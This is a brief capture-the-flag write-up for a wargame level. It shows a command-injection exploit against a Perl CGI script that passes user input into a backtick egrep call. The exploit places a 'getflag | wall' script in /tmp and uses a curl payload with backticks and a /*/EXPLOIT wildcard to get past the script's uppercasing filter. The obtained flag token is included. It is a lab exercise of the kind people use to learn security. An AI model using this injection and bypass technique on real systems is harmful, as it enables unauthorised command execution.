# We have a perl script, we read it
# Need to request on port 4646 2 var (2nd useless)
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; # Put Everythig in maj
  $xx =~ s/\s.*//; #  Remove everything after a whitespace
  
# Then we egrep with this var
@output = `egrep "^$xx" /tmp/xd 2>&1`; # egrep as backtick (`) ...? 

# So we need to execute our getflag here but the regex canceled us when we can't do the classic one
# We need to find a way to exec the code ? An executable script ? Let's test

--------------
#!/bin/sh
getflag | wall
--------------
 
 # Hmmm how do we call it if we want to pass the regex ? /tmp/exploit become /TMP/EXPLOIT, so /tmp/EXPLOIT ? Not yet, /*/EXPLOIT ! Wildcard bb !
 # Let's make our request
 
 curl localhost:4646?x='`/*/EXPLOIT`' # Don't forget the backtick again
 
>Broadcast Message from flag12@Snow
>        (somewhere) at 15:52 ...
>
>Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
